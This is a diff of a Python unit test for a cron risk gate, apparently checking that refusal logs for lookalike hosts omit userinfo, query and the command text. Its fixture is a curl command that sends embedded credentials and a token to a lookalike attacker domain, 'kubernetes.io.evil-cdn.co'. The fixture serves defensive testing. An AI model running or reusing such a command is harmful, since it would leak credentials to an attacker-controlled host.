@@ -480,9 +480,11 @@ class CronRiskGateTest(unittest.TestCase):
         self._assert_refusal_log_identifies_command_without_text(captured, command)
 
     def test_lookalike_refusal_log_omits_userinfo_and_query(self):
-        # The host token is cut from the command, so the log line must carry
-        # the hostname alone: not the userinfo in front of it, not the query
-        # behind it, and not the command it came from.
+        # _HOST_TOKEN's character class excludes the ':', '@', '/' and '?'
+        # that delimit userinfo, path and query, so none of them crosses into
+        # the log with the host, and the command itself never does. (A
+        # userinfo that is itself host-shaped is a different token, which the
+        # gate judges as a host in its own right.)
         command = (
             "curl https://deploy:SECRET-MARKER@kubernetes.io.evil-cdn.co"
             "/manifest.yaml?token=QUERY-MARKER"
